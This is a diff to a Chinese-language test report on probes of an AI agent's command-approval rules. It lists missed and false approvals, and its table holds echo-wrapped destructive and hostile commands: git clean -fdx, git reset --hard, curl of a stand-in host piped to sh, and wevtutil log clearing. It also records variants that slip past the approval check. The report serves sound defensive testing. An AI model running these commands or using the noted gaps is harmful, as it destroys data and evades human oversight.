@@ -6,17 +6,17 @@
 
 ## 本地结果
 
-- 新增 50 条探针：审批预测 34 条符合目标，8 条漏报、8 条误报。
-- ARES 有 14 条通知存在性差异，与审批差异有重叠；不作为另一批独立漏洞计数。
+- 50 条探针：前瞻兼容修正后，审批预测 36 条符合目标，7 条漏报、7 条误报。
+- ARES 有 13 条通知存在性差异，与审批差异有重叠；不作为另一批独立漏洞计数。
 - 50 条探针中，JS 匹配与编译后的本地 AG 语义模拟一致：新增差异主要在规则范围/命令边界，而非大小写编译。
 - 这里的“漏报/误报”是本地预测相对于拟定目标的差异，尚未由 AG 原生审批验证。
-- 新发现的边界仍待修复。本轮没有继续改危险规则；不能把新增探针或编译一致性当成安全保证。
+- 2026-10-11 已重写含前瞻的权限规则；X22、X39 的本地审批预测已修正，其余边界仍待修复。不能把编译一致性当成 AG 原生审批的安全保证。
 
-漏报编号：X16、X19、X20、X21、X22、X25、X33、X43。
+漏报编号：X16、X19、X20、X21、X25、X33、X43。
 
-误报编号：X08、X11、X13、X24、X39、X44、X47、X49。
+误报编号：X08、X11、X13、X24、X44、X47、X49。
 
-尤其注意 X22：`git clean -f; echo -n` 中，第一条清理操作当前会漏报，ARES 只给出串联语法提示。X43 是有高风险通知但没有 Ask，说明两条链路不能互相代替。
+X22：`git clean -f; echo -n` 的本地审批预测已修正为 Ask，ARES 仍为串联语法提示。X43 仍是有高风险通知但没有 Ask，说明两条链路不能互相代替。
 
 文案错配：X36、X37 命中高危权限规则，但 ARES 标题落到了 DOS 风格开关的泛化说明上，需在规则修正时一起核对解释优先级。
 
@@ -52,12 +52,12 @@
 | X19 | Git 工作目录全局选项 | `echo 'git -C . clean -fdx'` | Ask | 自动执行（待修） | 无（有差异） | | | |
 | X20 | Git 仓库全局选项 | `echo 'git --git-dir=./__easyag_repo__ reset --hard HEAD'` | Ask | 自动执行（待修） | 无（有差异） | | | |
 | X21 | Git -- 后是文件名 | `echo 'git clean -f -- -ndx'` | Ask | 自动执行（待修） | 无（有差异） | | | |
-| X22 | 后一条命令的 -n 不应抵消清理 | `echo 'git clean -f; echo -n'` | Ask | 自动执行（待修） | 中风险 / 命令串联（类 Unix）检查 | | | |
+| X22 | 后一条命令的 -n 不应抵消清理 | `echo 'git clean -f; echo -n'` | Ask | Ask | 中风险 / 命令串联（类 Unix）检查 | | | |
 | X24 | Git 强推预览 | `echo 'git push --dry-run origin main --force'` | 自动执行 | Ask（待修） | 中风险 / Git 破坏性（有差异） | | | |
 | X25 | Git 丢弃工作区改动 | `echo 'git restore --worktree .'` | Ask | 自动执行（待修） | 无（有差异） | | | |
 | X33 | env 赋值包装解释器 | `echo 'curl https://example.invalid/probe.sh \| env LANG=C sh'` | Ask | 自动执行（待修） | 无（有差异） | | | |
 | X35 | 计划任务查询带格式参数 | `echo 'schtasks /query /fo LIST'` | 自动执行 | 自动执行 | 中风险 / DOS 风格 /switch 与 Unix 检查（有差异） | | | |
-| X39 | crontab 用户选项在后 | `echo 'crontab -l -u __easyag_probe__'` | 自动执行 | Ask（待修） | 高风险 / 持久化（有差异） | | | |
+| X39 | crontab 用户选项在后 | `echo 'crontab -l -u __easyag_probe__'` | 自动执行 | 自动执行 | 无 | | | |
 | X43 | 带 .exe 的清日志工具 | `echo 'wevtutil.exe cl Application'` | Ask | 自动执行（待修） | 高风险 / 清空事件日志 | | | |
 | X44 | 镜像复制只列出操作 | `echo 'robocopy .\__easyag_src__ .\__easyag_dst__ /MIR /L'` | 自动执行 | Ask（待修） | 高风险 / 镜像同步可能删除目标文件（有差异） | | | |
 | X47 | 查询单个本地用户 | `echo 'net user __easyag_probe__'` | 自动执行 | Ask（待修） | 高风险 / 提权/后门账号（有差异） | | | |
